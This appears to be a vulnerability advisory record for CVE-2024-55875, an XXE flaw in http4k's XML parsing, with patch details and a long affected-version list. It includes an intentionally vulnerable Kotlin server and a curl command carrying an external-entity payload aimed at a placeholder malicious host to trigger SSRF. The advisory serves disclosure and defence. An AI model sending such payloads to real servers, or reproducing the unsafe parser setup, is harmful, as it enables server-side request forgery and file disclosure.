@@ -1,0 +1,890 @@
+advisory_id: GHSA-7mj5-hjjj-8rgw
+datasource_id: github_osv/GHSA-7mj5-hjjj-8rgw
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/12/GHSA-7mj5-hjjj-8rgw/GHSA-7mj5-hjjj-8rgw.json
+aliases:
+  - CVE-2024-55875
+summary: |
+  http4k has a potential XXE (XML External Entity Injection) vulnerability
+  ### Summary
+  _Short summary of the problem. Make the impact and severity as clear as possible. For example: An unsafe deserialization vulnerability allows any unauthenticated user to execute arbitrary code on the server._
+
+  There is a potential XXE(XML External Entity Injection) vulnerability when http4k handling malicious XML contents within requests, which might allow attackers to read local sensitive information on server, trigger Server-side Request Forgery and even execute code under some circumstances.
+
+  ### Details
+  _Give all details on the vulnerability. Pointing to the incriminated source code is very helpful for the maintainer._
+  https://github.com/http4k/http4k/blob/25696dff2d90206cc1da42f42a1a8dbcdbcdf18c/core/format/xml/src/main/kotlin/org/http4k/format/Xml.kt#L42-L46
+  XML contents is parsed with DocumentBuilder without security settings on or external entity enabled
+
+  ### PoC
+  _Complete instructions, including specific configuration details, to reproduce the vulnerability._
+  #### Example Vulnerable server code:
+  ```
+  import org.http4k.core.*
+  import org.http4k.format.Xml.xml
+  import org.http4k.server.Netty
+  import org.http4k.server.asServer
+  import org.w3c.dom.Document
+
+  fun main() {
+
+      val xmlLens = Body.xml().toLens()
+
+      // Create an HTTP handler
+      val app: HttpHandler = { request ->
+          try {
+              // Parse the incoming XML payload to a Document object
+              val xmlDocument: Document = xmlLens(request)
+
+              // Extract root element name or other details from the XML
+              val rootElementName = xmlDocument.documentElement.nodeName
+
+              // Create a response XML based on the extracted information
+              val responseXml = """
+                  <response>
+                      <message>Root element is: $rootElementName</message>
+                  </response>
+              """.trimIndent()
+
+              // Respond with XML
+              Response(Status.OK).body(responseXml).header("Content-Type", "application/xml")
+          } catch (e: Exception) {
+              // Handle invalid XML or other errors
+              Response(Status.BAD_REQUEST).body("Invalid XML: ${e.message}")
+          }
+      }
+
+      // Start the server
+      val server = app.asServer(Netty(9000)).start()
+      println("Server started on http://localhost:9000")
+  }
+  ```
+  #### Maven dependency:
+  ```
+  <dependencies>
+          <dependency>
+              <groupId>org.jetbrains.kotlin</groupId>
+              <artifactId>kotlin-test-junit5</artifactId>
+              <version>1.9.0</version>
+              <scope>test</scope>
+          </dependency>
+          <dependency>
+              <groupId>org.junit.jupiter</groupId>
+              <artifactId>junit-jupiter-engine</artifactId>
+              <version>5.10.0</version>
+              <scope>test</scope>
+          </dependency>
+          <dependency>
+              <groupId>org.jetbrains.kotlin</groupId>
+              <artifactId>kotlin-stdlib</artifactId>
+              <version>1.9.0</version>
+          </dependency>
+
+          <dependency>
+              <groupId>org.http4k</groupId>
+              <artifactId>http4k-core</artifactId>
+              <version>5.40.0.0</version>
+          </dependency>
+
+          <!-- Http4k XML format -->
+          <dependency>
+              <groupId>org.http4k</groupId>
+              <artifactId>http4k-format-xml</artifactId>
+              <version>5.40.0.0</version>
+          </dependency>
+
+          <!-- http4k Netty -->
+          <dependency>
+              <groupId>org.http4k</groupId>
+              <artifactId>http4k-server-netty</artifactId>
+              <version>5.40.0.0</version>
+          </dependency>
+      </dependencies>
+  ```
+  #### Exploit payload example to trigger SSRF
+  `curl -X POST http://localhost:9000 -H "Content-Type: application/xml" -d "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"https://replace.with.your.malicious.website/poc\">]><root>&xxe;</root>"`
+
+
+  ### Impact
+  _What kind of vulnerability is it? Who is impacted?_
+  The servers that employ this XML parsing feature of http4k are vulnerable to this XXE vulnerability
+
+  ### Follow-up patch — v6.50.0.0 (May 2026)
+
+  The original fix shipped in v5.41.0.0 / v4.50.0.0 closed the documented external-entity attack class (SSRF, local-file disclosure, code execution) by setting `ACCESS_EXTERNAL_DTD=""`, `ACCESS_EXTERNAL_SCHEMA=""`, and `isExpandEntityReferences=false` on the default `DocumentBuilderFactory`.
+
+  A residual gap remained: the parser still **accepted** documents containing `<!DOCTYPE>` declarations even though external entity resolution was blocked. This left open billion-laughs-style internal entity expansion DoS attacks against any application using `Body.xml()` or `Document.asXmlDocument()` on untrusted XML.
+
+    **v6.50.0.0** closes this residual by adding `disallow-doctype-decl=true` and `FEATURE_SECURE_PROCESSING=true` to `defaultXmlParsingConfig`. Any document containing a `<!DOCTYPE>` is now rejected at parse time.
+
+  #### Follow-up affected & fixed versions
+
+    | Version | Fixed Version |
+    |---------|---------------|
+    | `>= 5.41.0.0, < 6.50.0.0` | **6.50.0.0** |
+
+  v6.x users should upgrade to v6.50.0.0. The patch is part of the v6.50.0.0 release; no separate backport is required for the v6 line. Older v5 / v4 users remain on the v5.41.0.0 / v4.50.0.0 fix (external-entity protection); the billion-laughs residual is fixed in those lines only via http4k EE LTS releases — contact [enterprise@http4k.org](mailto:enterprise@http4k.org) if you need it.
+
+  #### Follow-up timeline
+
+    | Date/time (UTC) | Notes |
+    |-----------------|-------|
+    | 31/05/2026 17:12 | Follow-up patch merged (commit [`c0cfaf5d63`](https://github.com/http4k/http4k/commit/c0cfaf5d63)) with new tests for `<!DOCTYPE>` rejection and billion-laughs payload rejection |
+    | 31/05/2026 18:06 | http4k v6.50.0.0 released to Maven Central |
+impacted_packages:
+  - purl: pkg:maven/org.http4k/http4k-format-xml
+    affected_versions: vers:maven/<6.50.0.0
+    fixed_versions: vers:maven/6.50.0.0
+    affected_packages:
+      - pkg:maven/org.http4k/http4k-format-xml@2.25.1
+      - pkg:maven/org.http4k/http4k-format-xml@2.25.4
+      - pkg:maven/org.http4k/http4k-format-xml@2.26.0
+      - pkg:maven/org.http4k/http4k-format-xml@2.26.1
+      - pkg:maven/org.http4k/http4k-format-xml@2.26.2
+      - pkg:maven/org.http4k/http4k-format-xml@2.27.0
+      - pkg:maven/org.http4k/http4k-format-xml@2.27.1
+      - pkg:maven/org.http4k/http4k-format-xml@2.27.2
+      - pkg:maven/org.http4k/http4k-format-xml@2.28.0
+      - pkg:maven/org.http4k/http4k-format-xml@2.29.0
+      - pkg:maven/org.http4k/http4k-format-xml@2.29.1
+      - pkg:maven/org.http4k/http4k-format-xml@2.29.2
+      - pkg:maven/org.http4k/http4k-format-xml@2.29.3
+      - pkg:maven/org.http4k/http4k-format-xml@2.29.4
+      - pkg:maven/org.http4k/http4k-format-xml@2.30.0
+      - pkg:maven/org.http4k/http4k-format-xml@2.31.0
+      - pkg:maven/org.http4k/http4k-format-xml@2.31.1
+      - pkg:maven/org.http4k/http4k-format-xml@2.31.2
+      - pkg:maven/org.http4k/http4k-format-xml@2.31.3
+      - pkg:maven/org.http4k/http4k-format-xml@2.31.4
+      - pkg:maven/org.http4k/http4k-format-xml@2.32.0
+      - pkg:maven/org.http4k/http4k-format-xml@2.33.0
+      - pkg:maven/org.http4k/http4k-format-xml@2.33.1
+      - pkg:maven/org.http4k/http4k-format-xml@2.34.0
+      - pkg:maven/org.http4k/http4k-format-xml@2.35.0
+      - pkg:maven/org.http4k/http4k-format-xml@2.35.1
+      - pkg:maven/org.http4k/http4k-format-xml@2.36.0
+      - pkg:maven/org.http4k/http4k-format-xml@2.37.0
+      - pkg:maven/org.http4k/http4k-format-xml@2.38.0
+      - pkg:maven/org.http4k/http4k-format-xml@2.38.1
+      - pkg:maven/org.http4k/http4k-format-xml@3.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.0.1
+      - pkg:maven/org.http4k/http4k-format-xml@3.1.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.1.1
+      - pkg:maven/org.http4k/http4k-format-xml@3.1.2
+      - pkg:maven/org.http4k/http4k-format-xml@3.1.3
+      - pkg:maven/org.http4k/http4k-format-xml@3.2.1
+      - pkg:maven/org.http4k/http4k-format-xml@3.2.2
+      - pkg:maven/org.http4k/http4k-format-xml@3.2.3
+      - pkg:maven/org.http4k/http4k-format-xml@3.3.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.3.1
+      - pkg:maven/org.http4k/http4k-format-xml@3.4.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.5.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.5.1
+      - pkg:maven/org.http4k/http4k-format-xml@3.6.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.6.1
+      - pkg:maven/org.http4k/http4k-format-xml@3.7.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.8.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.9.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.10.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.11.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.11.1
+      - pkg:maven/org.http4k/http4k-format-xml@3.12.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.13.3
+      - pkg:maven/org.http4k/http4k-format-xml@3.13.4
+      - pkg:maven/org.http4k/http4k-format-xml@3.14.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.14.1
+      - pkg:maven/org.http4k/http4k-format-xml@3.15.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.16.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.17.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.17.1
+      - pkg:maven/org.http4k/http4k-format-xml@3.18.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.18.1
+      - pkg:maven/org.http4k/http4k-format-xml@3.19.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.20.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.21.1
+      - pkg:maven/org.http4k/http4k-format-xml@3.21.2
+      - pkg:maven/org.http4k/http4k-format-xml@3.22.2
+      - pkg:maven/org.http4k/http4k-format-xml@3.22.4
+      - pkg:maven/org.http4k/http4k-format-xml@3.23.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.23.1
+      - pkg:maven/org.http4k/http4k-format-xml@3.24.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.25.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.26.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.26.1
+      - pkg:maven/org.http4k/http4k-format-xml@3.26.2
+      - pkg:maven/org.http4k/http4k-format-xml@3.26.3
+      - pkg:maven/org.http4k/http4k-format-xml@3.26.4
+      - pkg:maven/org.http4k/http4k-format-xml@3.26.5
+      - pkg:maven/org.http4k/http4k-format-xml@3.26.6
+      - pkg:maven/org.http4k/http4k-format-xml@3.28.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.29.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.31.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.32.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.32.1
+      - pkg:maven/org.http4k/http4k-format-xml@3.33.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.33.1
+      - pkg:maven/org.http4k/http4k-format-xml@3.33.2
+      - pkg:maven/org.http4k/http4k-format-xml@3.34.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.34.1
+      - pkg:maven/org.http4k/http4k-format-xml@3.34.2
+      - pkg:maven/org.http4k/http4k-format-xml@3.35.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.35.1
+      - pkg:maven/org.http4k/http4k-format-xml@3.35.2
+      - pkg:maven/org.http4k/http4k-format-xml@3.36.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.36.1
+      - pkg:maven/org.http4k/http4k-format-xml@3.37.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.37.1
+      - pkg:maven/org.http4k/http4k-format-xml@3.38.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.38.1
+      - pkg:maven/org.http4k/http4k-format-xml@3.39.1
+      - pkg:maven/org.http4k/http4k-format-xml@3.39.2
+      - pkg:maven/org.http4k/http4k-format-xml@3.39.3
+      - pkg:maven/org.http4k/http4k-format-xml@3.93.4
+      - pkg:maven/org.http4k/http4k-format-xml@3.94.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.94.1
+      - pkg:maven/org.http4k/http4k-format-xml@3.95.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.95.1
+      - pkg:maven/org.http4k/http4k-format-xml@3.98.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.99.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.100.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.102.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.102.1
+      - pkg:maven/org.http4k/http4k-format-xml@3.103.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.105.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.108.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.109.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.110.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.111.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.112.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.112.1
+      - pkg:maven/org.http4k/http4k-format-xml@3.112.2
+      - pkg:maven/org.http4k/http4k-format-xml@3.113.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.114.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.115.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.115.1
+      - pkg:maven/org.http4k/http4k-format-xml@3.116.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.117.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.118.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.119.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.120.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.121.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.122.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.123.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.124.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.125.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.126.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.127.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.128.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.129.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.130.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.131.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.132.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.133.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.134.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.135.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.137.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.137.1
+      - pkg:maven/org.http4k/http4k-format-xml@3.138.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.138.1
+      - pkg:maven/org.http4k/http4k-format-xml@3.139.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.140.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.141.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.142.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.143.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.143.1
+      - pkg:maven/org.http4k/http4k-format-xml@3.144.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.145.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.146.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.147.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.148.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.149.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.150.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.151.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.152.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.153.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.154.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.154.1
+      - pkg:maven/org.http4k/http4k-format-xml@3.155.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.156.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.157.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.157.1
+      - pkg:maven/org.http4k/http4k-format-xml@3.158.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.158.1
+      - pkg:maven/org.http4k/http4k-format-xml@3.159.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.160.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.160.1
+      - pkg:maven/org.http4k/http4k-format-xml@3.161.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.162.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.164.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.165.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.166.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.166.1
+      - pkg:maven/org.http4k/http4k-format-xml@3.167.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.168.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.171.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.172.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.174.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.175.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.177.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.179.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.179.1
+      - pkg:maven/org.http4k/http4k-format-xml@3.180.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.182.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.183.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.185.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.186.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.187.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.188.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.189.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.190.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.191.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.192.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.193.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.193.1
+      - pkg:maven/org.http4k/http4k-format-xml@3.194.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.195.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.195.1
+      - pkg:maven/org.http4k/http4k-format-xml@3.196.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.197.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.198.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.199.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.199.1
+      - pkg:maven/org.http4k/http4k-format-xml@3.200.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.201.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.202.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.203.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.204.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.205.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.206.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.207.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.209.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.210.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.211.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.212.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.213.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.214.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.215.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.216.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.218.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.219.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.220.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.221.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.222.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.223.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.224.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.225.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.226.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.227.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.230.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.231.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.232.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.234.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.235.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.237.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.238.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.239.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.240.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.241.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.242.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.243.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.245.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.245.1
+      - pkg:maven/org.http4k/http4k-format-xml@3.246.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.248.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.251.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.252.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.253.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.254.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.255.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.256.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.257.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.258.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.259.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.260.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.261.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.262.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.263.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.264.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.265.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.266.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.268.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.269.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.270.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.271.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.272.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.273.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.274.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.275.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.276.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.277.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.278.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.279.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.281.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.283.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.283.1
+      - pkg:maven/org.http4k/http4k-format-xml@3.284.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.285.0
+      - pkg:maven/org.http4k/http4k-format-xml@3.285.1
+      - pkg:maven/org.http4k/http4k-format-xml@3.285.2
+      - pkg:maven/org.http4k/http4k-format-xml@4.0.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.1.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.1.1.1
+      - pkg:maven/org.http4k/http4k-format-xml@4.1.1.2
+      - pkg:maven/org.http4k/http4k-format-xml@4.1.2.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.1.2.1
+      - pkg:maven/org.http4k/http4k-format-xml@4.2.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.3.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.3.2.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.3.2.1
+      - pkg:maven/org.http4k/http4k-format-xml@4.3.2.2
+      - pkg:maven/org.http4k/http4k-format-xml@4.3.3.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.3.4.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.3.4.1
+      - pkg:maven/org.http4k/http4k-format-xml@4.3.5.1
+      - pkg:maven/org.http4k/http4k-format-xml@4.3.5.2
+      - pkg:maven/org.http4k/http4k-format-xml@4.3.5.3
+      - pkg:maven/org.http4k/http4k-format-xml@4.3.5.4
+      - pkg:maven/org.http4k/http4k-format-xml@4.4.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.4.0.1
+      - pkg:maven/org.http4k/http4k-format-xml@4.4.1.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.4.2.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.5.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.5.0.1
+      - pkg:maven/org.http4k/http4k-format-xml@4.6.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.7.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.7.0.1
+      - pkg:maven/org.http4k/http4k-format-xml@4.7.0.2
+      - pkg:maven/org.http4k/http4k-format-xml@4.7.1.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.8.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.8.1.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.8.2.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.9.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.9.0.1
+      - pkg:maven/org.http4k/http4k-format-xml@4.9.0.2
+      - pkg:maven/org.http4k/http4k-format-xml@4.9.1.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.9.2.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.9.3.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.9.3.1
+      - pkg:maven/org.http4k/http4k-format-xml@4.9.4.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.9.5.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.9.6.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.9.7.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.9.8.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.9.9.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.9.10.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.10.0.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.10.0.1
+      - pkg:maven/org.http4k/http4k-format-xml@4.10.1.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.11.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.11.0.1
+      - pkg:maven/org.http4k/http4k-format-xml@4.12.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.12.0.1
+      - pkg:maven/org.http4k/http4k-format-xml@4.12.1.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.12.2.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.12.3.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.12.3.1
+      - pkg:maven/org.http4k/http4k-format-xml@4.13.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.13.1.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.13.3.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.13.4.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.14.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.14.1.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.14.1.1
+      - pkg:maven/org.http4k/http4k-format-xml@4.14.1.2
+      - pkg:maven/org.http4k/http4k-format-xml@4.14.1.3
+      - pkg:maven/org.http4k/http4k-format-xml@4.14.1.4
+      - pkg:maven/org.http4k/http4k-format-xml@4.15.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.16.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.16.1.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.16.2.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.16.3.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.17.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.17.1.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.17.2.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.17.3.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.17.4.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.17.5.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.17.6.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.17.7.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.17.8.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.17.9.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.18.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.19.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.19.1.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.19.2.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.19.3.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.19.4.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.19.5.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.20.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.20.1.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.20.2.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.21.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.21.1.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.21.1.1
+      - pkg:maven/org.http4k/http4k-format-xml@4.22.0.0
+      - pkg:maven/org.http4k/http4k-format-xml@4.22.0.1
